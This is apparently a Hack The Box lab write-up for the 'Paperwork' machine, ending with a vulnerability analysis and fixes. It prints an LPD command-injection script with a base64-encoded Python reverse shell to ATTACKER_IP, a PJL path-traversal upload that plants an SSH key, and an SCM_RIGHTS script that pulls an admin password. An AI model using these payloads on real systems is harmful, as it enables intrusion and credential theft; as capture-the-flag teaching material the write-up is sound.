
# Paperwork – HTB Machine Writeup

![HTB Badge](https://img.shields.io/badge/HTB-Paperwork-brightgreen)  
**Date**: July 2026  
**OS**: Linux   
**Difficulty**: Easy   
**Techniques**: LPD Injection, PJL File Upload, SCM_RIGHTS Credential Theft, Password Reuse

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)  
2. [Initial Foothold – LPD Command Injection](#initial-foothold--lpd-command-injection)  
3. [Low‑Privilege Enumeration](#lowprivilege-enumeration)  
4. [Gaining archivist Access – PJL File Upload](#gaining-archivist-access--pjl-file-upload)  
5. [Extracting Admin Password via SCM_RIGHTS](#extracting-admin-password-via-scm_rights)  
6. [Privilege Escalation to Root](#privilege-escalation-to-root)  
7. [Vulnerability Analysis](#vulnerability-analysis)  
8. [Conclusion](#conclusion)

---

## Reconnaissance

### Nmap Scan

```
nmap -sC -sV -p- -T4 -oN nmap_full.txt TARGET_IP
```

**Results**:

- `22/tcp open ssh` – OpenSSH 10.0p2 Ubuntu
- `80/tcp open http` – nginx 1.28.0 (Ubuntu), redirects to `http://paperwork.htb`
- `1515/tcp open?` – custom service; fingerprint reveals `Archive_Printer is ready and printing.`

The service on port 1515 responds with the same message for commands 3 and 4, indicating a custom **LPD (Line Printer Daemon)** implementation. The web page confirms a legacy ingestion service using RFC 1179 with queue `archive_intake`.

We also find a `server.py` script (either from the web or via path traversal) that implements this LPD server.

---

## Initial Foothold – LPD Command Injection

### Vulnerability

The `server.py` contains the following code:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The variable `job_name` is extracted from the data chunk (line starting with `J`). Because `shell=True` is used, we can break out of the single quotes and execute arbitrary commands.

### Exploit

We craft an LPD packet:

1. Send `\x02` + queue name (`archive_intake`) to initiate a print job.
2. Send a control chunk with subcommand `\x02`, a size, and the data containing `J'; <command>; #`.
3. The command is base64‑encoded to avoid escaping, and we use a Python reverse shell.

**Exploit script** (run on attacker machine):

```python
import socket
import base64

TARGET = "TARGET_IP"
PORT = 1515
QUEUE = "archive_intake"
LHOST = "ATTACKER_IP"   # Your IP
LPORT = 4444

cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
b64 = base64.b64encode(cmd.encode()).decode()
payload = f"'; echo {b64} | base64 -d | sh; #"

job_line = f"J{payload}\n".encode()
size = len(job_line)
chunk = b'\x02 ' + str(size).encode() + b'\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((TARGET, PORT))

# Send queue
s.send(b'\x02' + QUEUE.encode())
resp = s.recv(1)
if resp != b'\x00':
    print("Queue rejected")
    s.close()
    exit(1)
print("[+] Queue accepted")

# Send chunk
s.send(chunk)
ack = s.recv(1)
if ack != b'\x00':
    print("Unexpected ACK")
    s.close()
    exit(1)

# Send data
s.send(job_line)
print("[+] Payload sent. Check your listener.")
s.close()
```

Start a listener on port 4444 (`nc -lvnp 4444`) and run the script. We obtain a shell as user `lp`.

---

## Low‑Privilege Enumeration

As `lp`, we explore the system:

- `id` → `uid=7(lp) gid=7(lp) groups=7(lp)`
- `ps aux` shows several interesting root processes:
  - `/usr/bin/python3 /root/staging/CorpoSite/app.py` – Flask web app on port 1337
  - `/usr/bin/python3 /usr/bin/paperwork-daemon` – management daemon using UNIX socket `/run/paperwork/mgmt.sock`
  - `/usr/bin/python3 /home/archivist/printer/jetdirect.py` – JetDirect service on port 9100 (runs as `archivist`)
- `ss -l` reveals local services: port 9100 (JetDirect), port 1337 (Flask), and the UNIX socket.
- We also note `/etc/paperwork/admin_pins.conf` (not readable) and `/home/archivist/` (not accessible).

From `systemctl` we confirm the three services:
- `corposite.service` (root, Flask)
- `paperwork.service` (root, management daemon)
- `jetdirect.service` (archivist, port 9100)

### Key Discovery: SCM_RIGHTS Exploit

The management daemon (`paperwork-daemon`) uses `sendmsg` with `SCM_RIGHTS` to pass file descriptors when a lockdown is triggered. The admin password is stored in `/etc/paperwork/admin_pins.conf` and the daemon passes that file's file descriptor to the client if a malicious pattern (`FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`) appears in the log file `/home/archivist/printer/logs/commands.log`. If we can become `archivist`, we can trigger this and read the password.

---

## Gaining archivist Access – PJL File Upload

### Vulnerability

The JetDirect service (`jetdirect.py`) listens on port 9100 and is used to send print jobs. It accepts **Printer Job Language (PJL)** commands without authentication. We can use `FSDOWNLOAD` to write arbitrary files to the filesystem, as the service runs as `archivist`.

### Exploit – Upload SSH Public Key

We craft a PJL command that writes our public key to `/home/archivist/.ssh/authorized_keys`:

```bash
cat > /tmp/pjl.py << 'EOF'
import socket, base64
pub = base64.b64decode("YOUR_BASE64_PUBLIC_KEY") + b"\n"
body = b"@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\r\n" % len(pub) + pub
s = socket.socket()
s.connect(("127.0.0.1", 9100))
s.send(b"\x1b%-12345X" + body + b"\x1b%-12345X\r\n")
try: s.recv(200)
except: pass
s.close()
EOF
python3 /tmp/pjl.py
```

Replace `YOUR_BASE64_PUBLIC_KEY` with the base64 encoding of your public SSH key (e.g., `cat ~/.ssh/id_rsa.pub | base64`).

Now we can SSH as `archivist`:

```bash
ssh -i ~/.ssh/id_rsa archivist@TARGET_IP
```

We now have a shell as `archivist`.

---

## Extracting Admin Password via SCM_RIGHTS

As `archivist`, we can trigger the lockdown and receive the file descriptor of `/etc/paperwork/admin_pins.conf`.

### Exploit

```bash
python3 -c "
import socket, array, os
LOG='/home/archivist/printer/logs/commands.log'
SOCK='/run/paperwork/mgmt.sock'
with open(LOG,'a') as f: f.write('FSUPLOAD trigger-lockdown\n')
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK)
fds=array.array('i')
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2*fds.itemsize))
for level, ctype, cdata in anc:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        cdata = cdata[:len(cdata) - (len(cdata) % fds.itemsize)]
        fds.frombytes(cdata)
for fd in fds:
    data = os.pread(fd, 4096, 0).decode(errors='ignore')
    if 'ADMIN_PASSWORD=' in data:
        print(data.split('ADMIN_PASSWORD=')[1].split('\n')[0].strip())
s.close()
"
```

Output: `ApparelMortuaryxxxxxxx☠️` (the admin password).

---

## Privilege Escalation to Root

We try the discovered password for `su root`:

```bash
su root
Password: ApparelMortuaryxxxxxxx☠️
```

We are now **root**! Read the flags:

```bash
cat /root/root.txt
cat /home/archivist/user.txt
```

---

## Vulnerability Analysis

### 1. LPD Command Injection (`server.py`)

- **Root cause**: Use of `shell=True` with unsanitized user input (`job_name`).
- **Impact**: Remote code execution as the `lp` user.
- **Fix**: Use `subprocess` without `shell=True`, pass arguments as a list, and sanitize input.

### 2. PJL File Upload (JetDirect)

- **Root cause**: The JetDirect service accepts arbitrary PJL commands without authentication, allowing `FSDOWNLOAD` to write files anywhere in the filesystem (using relative path with `0:/../`).
- **Impact**: Allows writing SSH keys, gaining SSH access as `archivist`.
- **Fix**: Restrict PJL commands, sanitize paths, and require authentication.

### 3. SCM_RIGHTS File Descriptor Leak (`paperwork-daemon`)

- **Root cause**: The daemon uses `sendmsg` with `SCM_RIGHTS` to pass a file descriptor of the admin configuration file to the client when a security incident is triggered. This descriptor is readable by the client, exposing the admin password.
- **Impact**: Privilege escalation from `archivist` to root (via password reuse for `su`).
- **Fix**: Avoid passing sensitive file descriptors; handle authentication securely without exposing file contents.

### 4. Weak Password Reuse

- The admin password from the config file is reused for the `root` user, allowing direct `su` after extraction.
- **Fix**: Use separate passwords and enforce strong password policies.

---

## Conclusion

This machine demonstrates a realistic chain of vulnerabilities often found in legacy enterprise systems:

- Command injection in a custom LPD server.
- Insecure PJL file upload in a JetDirect service.
- File descriptor leaks via `SCM_RIGHTS` in a management daemon.
- Weak password reuse leading to root.
---

<p align="center"> <strong>Happy Hacking ☠️🚀</strong> </p> 
